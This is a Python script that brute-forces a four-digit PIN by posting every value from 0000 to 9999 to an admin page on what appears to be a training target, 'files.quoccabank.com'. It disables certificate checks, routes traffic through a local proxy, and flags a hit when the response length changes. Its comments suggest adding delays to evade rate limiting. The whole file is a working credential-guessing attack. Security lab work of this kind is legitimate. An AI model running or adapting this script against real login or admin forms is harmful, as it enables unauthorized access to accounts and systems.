import requests

# Disable InsecureRequestWarning from urllib3 if you're interacting with an HTTPS site with an unverified SSL certificate
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Set up an HTTP session object
s = requests.session()
s.verify = False # Set to 'False' if you want to ignore SSL certification (not recommended for production)
# If you want to use a proxy for debugging, uncomment the following line
s.proxies = {"https": "http://127.0.0.1:8080"}

# The URL that the form submits to might be different than the page you see the form on.
# Make sure you've got the correct URL that the form data should be posted to.
url = "https://files.quoccabank.com/admin"

# Use a loop to try all combinations from 0000 to 9999
for i in range(10000):
    # Format the pin to be a 4-digit string, padded with zeros if necessary
    pin = f"{i:04d}"

    # Print the current attempt for debugging purposes
    print(f"Trying PIN code: {pin}")

    # Prepare the POST data
    post_data = {'pin': pin}

    # Attempt a POST request with the current PIN code
    r = s.post(url, data=post_data)
    
    # Check if the attempt was successful, you need to define this condition:
    # If the response indicates a successful attempt, break the loop
    if 'success condition' in r.text:
        print(f"Success with PIN code: {pin}")
        break
    elif '<specific failed attempt message>' in r.text:
        # Handle the failed attempt if there's a specific message you're looking for
        pass
    else:
        # If output is neither success nor a known failure message
        print(f"Unexpected response for PIN code: {pin}")
        if len(r.text) != 198:
            print(f"this one!: {pin}")
            exit()

    # You may also want to add some sleep time to not overwhelm the server 
    # and to evade potential rate limiting, example:
    # import time
    # time.sleep(1)